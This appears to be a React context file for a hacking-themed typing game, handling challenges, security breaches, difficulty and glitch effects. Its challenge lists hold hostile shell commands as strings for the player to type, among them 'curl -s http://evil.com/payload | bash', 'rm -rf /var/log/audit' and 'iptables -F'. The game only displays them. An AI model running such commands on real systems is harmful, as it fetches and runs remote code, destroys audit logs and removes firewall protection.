"use client"

import { createContext, useContext, useState, type ReactNode, useCallback, useEffect } from "react"
import { useMission } from "./mission-context"
import { useAudio } from "@/hooks/use-audio"

interface GameMechanicsContextType {
  // Difficulty settings
  difficulty: "easy" | "medium" | "hard"
  setDynamicDifficulty: (typingSpeed: number) => void

  // Challenges
  activeChallengeType: "none" | "bruteforce" | "portscan" | "firewall" | "intrusion" | "virus" | "webcam"
  activeChallengeData: any
  startChallenge: (type: "bruteforce" | "portscan" | "firewall" | "intrusion" | "virus" | "webcam") => void
  completeChallenge: (success: boolean) => void

  // Security breach
  securityBreaches: number
  addSecurityBreach: () => void
  resetSecurityBreaches: () => void
  isGameOver: boolean

  // Random events
  triggerRandomEvent: () => void

  // Glitch effects
  glitchIntensity: number
  updateGlitchIntensity: (progress: number) => void

  // Pause state
  isPaused: boolean
  togglePause: () => void
  setPaused: (paused: boolean) => void
}

const GameMechanicsContext = createContext<GameMechanicsContextType | undefined>(undefined)

export const GameMechanicsProvider = ({ children }: { children: ReactNode }) => {
  const { missionProgress, updateProgress } = useMission()
  const { playSound } = useAudio()

  // Difficulty settings
  const [difficulty, setDifficulty] = useState<"easy" | "medium" | "hard">("medium")

  // Challenge state
  const [activeChallengeType, setActiveChallengeType] = useState<
    "none" | "bruteforce" | "portscan" | "firewall" | "intrusion" | "virus" | "webcam"
  >("none")
  const [activeChallengeData, setActiveChallengeData] = useState<any>(null)

  // Security breach state
  const [securityBreaches, setSecurityBreaches] = useState(0)
  const [isGameOver, setIsGameOver] = useState(false)

  // Glitch effects
  const [glitchIntensity, setGlitchIntensity] = useState(0)

  // Pause state
  const [isPaused, setIsPaused] = useState(false)

  // Set difficulty based on typing speed
  const setDynamicDifficulty = useCallback((typingSpeed: number) => {
    if (typingSpeed < 30) {
      setDifficulty("easy")
    } else if (typingSpeed < 60) {
      setDifficulty("medium")
    } else {
      setDifficulty("hard")
    }
  }, [])

  // Toggle pause state
  const togglePause = useCallback(() => {
    setIsPaused((prev) => !prev)
    playSound("minimize")
  }, [playSound])

  // Set pause state directly
  const setPaused = useCallback(
    (paused: boolean) => {
      setIsPaused(paused)
      if (paused) {
        playSound("minimize")
      }
    },
    [playSound],
  )

  // Start a challenge
  const startChallenge = useCallback(
    (type: "bruteforce" | "portscan" | "firewall" | "intrusion" | "virus" | "webcam") => {
      // Don't start a new challenge if one is already active or game is paused
      if (activeChallengeType !== "none" || isPaused) return

      let challengeData: any = null

      switch (type) {
        case "bruteforce":
          // Generate a random password
          const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"
          let password = ""
          for (let i = 0; i < 8; i++) {
            password += chars.charAt(Math.floor(Math.random() * chars.length))
          }
          challengeData = { password, timeLimit: 10 }
          break

        case "portscan":
          // Generate random IP and port
          const ip = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(
            Math.random() * 256,
          )}.${Math.floor(Math.random() * 256)}`
          const port = Math.floor(Math.random() * 65535)
          challengeData = { ip, port, timeLimit: 8 }
          break

        case "firewall":
          // Generate a captcha-like challenge
          const operations = ["+", "-", "*"]
          const num1 = Math.floor(Math.random() * 10) + 1
          const num2 = Math.floor(Math.random() * 10) + 1
          const operation = operations[Math.floor(Math.random() * operations.length)]
          let answer = 0

          switch (operation) {
            case "+":
              answer = num1 + num2
              break
            case "-":
              answer = num1 - num2
              break
            case "*":
              answer = num1 * num2
              break
          }

          challengeData = { equation: `${num1} ${operation} ${num2}`, answer, timeLimit: 5 }
          break

        case "intrusion":
          // Generate a command to disable security
          const commands = [
            "killall -9 security",
            "rm -rf /var/log/audit",
            "echo 0 > /proc/sys/security/level",
            "systemctl stop firewall",
            "iptables -F",
          ]
          const command = commands[Math.floor(Math.random() * commands.length)]
          challengeData = { command, timeLimit: 10 }
          break

        case "virus":
          // Generate virus activation command
          const virusCommands = [
            "chmod +x virus.sh && ./virus.sh",
            "python3 ransomware.py --encrypt",
            "exec malware.bin --silent",
            "./backdoor -p 4444 -s",
            "curl -s http://evil.com/payload | bash",
          ]
          const virusCommand = virusCommands[Math.floor(Math.random() * virusCommands.length)]
          challengeData = { command: virusCommand, timeLimit: 15 }
          break

        case "webcam":
          // Generate command to block webcam access
          const webcamCommands = [
            "kill -9 $(pgrep webcam)",
            "echo 1 > /sys/devices/webcam/disable",
            "rmmod uvcvideo",
            "sudo chmod 000 /dev/video0",
            "firewall-cmd --add-rich-rule='rule family=ipv4 source address=10.0.0.1 reject'",
          ]
          const webcamCommand = webcamCommands[Math.floor(Math.random() * webcamCommands.length)]
          challengeData = { command: webcamCommand, timeLimit: 5 }
          break
      }

      setActiveChallengeType(type)
      setActiveChallengeData(challengeData)
      playSound("alert")
    },
    [activeChallengeType, isPaused, playSound],
  )

  // Complete a challenge
  const completeChallenge = useCallback(
    (success: boolean) => {
      if (success) {
        playSound("success")
        // Reward progress based on challenge type
        switch (activeChallengeType) {
          case "bruteforce":
            updateProgress(Math.min(missionProgress + 10, 100))
            break
          case "portscan":
            updateProgress(Math.min(missionProgress + 8, 100))
            break
          case "firewall":
            updateProgress(Math.min(missionProgress + 5, 100))
            break
          case "intrusion":
            // No progress reward, but prevents security breach
            break
          case "virus":
            updateProgress(Math.min(missionProgress + 15, 100))
            break
          case "webcam":
            // No progress reward, but prevents security breach
            break
        }
      } else {
        playSound("error")
        // Penalty for failing challenge
        if (activeChallengeType === "intrusion" || activeChallengeType === "webcam") {
          addSecurityBreach()
        }
      }

      setActiveChallengeType("none")
      setActiveChallengeData(null)
    },
    [activeChallengeType, missionProgress, updateProgress, playSound],
  )

  // Add a security breach
  const addSecurityBreach = useCallback(() => {
    setSecurityBreaches((prev) => {
      const newBreaches = prev + 1
      if (newBreaches >= 3) {
        setIsGameOver(true)
        playSound("gameover")
      } else {
        playSound("breach")
      }
      return newBreaches
    })
  }, [playSound])

  // Reset security breaches
  const resetSecurityBreaches = useCallback(() => {
    setSecurityBreaches(0)
    setIsGameOver(false)
  }, [])

  // Trigger a random event based on progress
  const triggerRandomEvent = useCallback(() => {
    // Don't trigger events if a challenge is active or game is paused
    if (activeChallengeType !== "none" || isPaused) return

    const randomValue = Math.random()

    if (missionProgress >= 90 && randomValue < 0.3) {
      startChallenge("virus")
    } else if (missionProgress >= 70 && randomValue < 0.25) {
      startChallenge("webcam")
    } else if (missionProgress >= 50 && randomValue < 0.2) {
      startChallenge("intrusion")
    } else if (missionProgress >= 30 && randomValue < 0.15) {
      startChallenge("firewall")
    } else if (randomValue < 0.1) {
      if (Math.random() < 0.5) {
        startChallenge("bruteforce")
      } else {
        startChallenge("portscan")
      }
    }
  }, [missionProgress, activeChallengeType, isPaused, startChallenge])

  // Update glitch intensity based on progress
  const updateGlitchIntensity = useCallback((progress: number) => {
    // Increase glitch intensity as progress increases
    const intensity = Math.min(progress / 20, 5)
    setGlitchIntensity(intensity)
  }, [])

  // Trigger random events periodically
  useEffect(() => {
    // Don't trigger events if game is paused
    if (isPaused) return

    const interval = setInterval(() => {
      if (Math.random() < 0.2 && !isGameOver) {
        triggerRandomEvent()
      }
    }, 15000) // Check every 15 seconds

    return () => clearInterval(interval)
  }, [triggerRandomEvent, isGameOver, isPaused])

  // Update glitch intensity when progress changes
  useEffect(() => {
    updateGlitchIntensity(missionProgress)
  }, [missionProgress, updateGlitchIntensity])

  return (
    <GameMechanicsContext.Provider
      value={{
        difficulty,
        setDynamicDifficulty,
        activeChallengeType,
        activeChallengeData,
        startChallenge,
        completeChallenge,
        securityBreaches,
        addSecurityBreach,
        resetSecurityBreaches,
        isGameOver,
        triggerRandomEvent,
        glitchIntensity,
        updateGlitchIntensity,
        isPaused,
        togglePause,
        setPaused,
      }}
    >
      {children}
    </GameMechanicsContext.Provider>
  )
}

export const useGameMechanics = () => {
  const context = useContext(GameMechanicsContext)
  if (context === undefined) {
    throw new Error("useGameMechanics must be used within a GameMechanicsProvider")
  }
  return context
}

